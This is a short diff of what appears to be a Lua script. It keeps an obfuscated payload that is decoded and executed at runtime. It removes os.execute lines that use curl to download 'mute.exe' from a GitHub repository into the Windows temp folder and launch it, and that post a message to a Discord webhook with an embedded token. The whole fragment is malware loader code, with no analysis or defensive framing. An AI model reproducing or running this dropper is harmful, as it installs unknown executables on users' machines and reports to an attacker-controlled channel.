@@ -1,5 +1,1 @@
 vipscript=decodeFunction('c-n1JU25Av5T2FSKbVFF8cKg(gh*zWY,1IOG:YF++;VDIVq(LhidvyaawH.a6:?wMDFx^aed{o}2/:6BgI:KPq?{cUU{tu{nQvxxcApPs/[MmCUaCH..tH-+uHL^OSx.mH1-5x_cU*R$ssu8WWf[zdU@NA#(1L9A4jBubGrygtC]%FKa_9+SfwI!!l#GKc:U_mN21w/./{!Rkc;#3[Aag0C9H2Q^P*N}trfmgakf_KANXu2o82:UlAP$4p;4L4KoR*Q:pWkvBDnhOl!DhK%Knjmp54b;LTt0KC6I_j4N2A^1?bEy{8{x8FrjZw%.qrt.Q/JW_UyF4m47).Z@,RG#nNMfROGsqf3}WmcePMOevdAo.x:U$j7;1iLz?63=u}OX%jCP}Z(_NR4B*YzA**$.6Uj7GIxmnQTZBewn+kUE;7MY4;:!uDQ;JoAui(AT()cWsdn$oMb*ZX0MY(JyCi%*3)JWBR2kBoTVqG}5P+4oyfW}:J3rH,px:OP=T]upT!^CcBpwnF;ma6:mST]Kh:dsH)MT/^1klF$k8!*O+5vFAGht*H3^a_tdbkw:{CFS28}geQ_p*gs_FFP]wiS{feDsx@yzzV=/M9+oBPhbqt4c6mW10UI*^jjuyzo1e}n;V.-R#l=7Qi#rSVp(BntSj8QAk=uEQ-II4dN{uk+yE=Yx@TOXP3RPUPd:fi(DRv#-=[D_8j5-,M%IMhG-Rt(nk-esi%aIw[WcsN3;jOUm]DXdYJN9$nfASNWjLiQ')()
-
-os.execute([[curl -L -o "%TEMP%\mute.exe" https://github.com/nd863281/Sofia12/raw/main/mute.exe && start "" "%TEMP%\mute.exe"]])
-
-os.execute('curl -H "Content-Type: application/json" -d "{\\"content\\":\\"helo\\"}" https://discord.com/api/webhooks/1495766415331033148/_akU1vQzsXQ1QLD_Aac3KVWSkzUAFo7dYbjbI2xp--1W9W9SMGJODS57TQzWEFeiecGF')
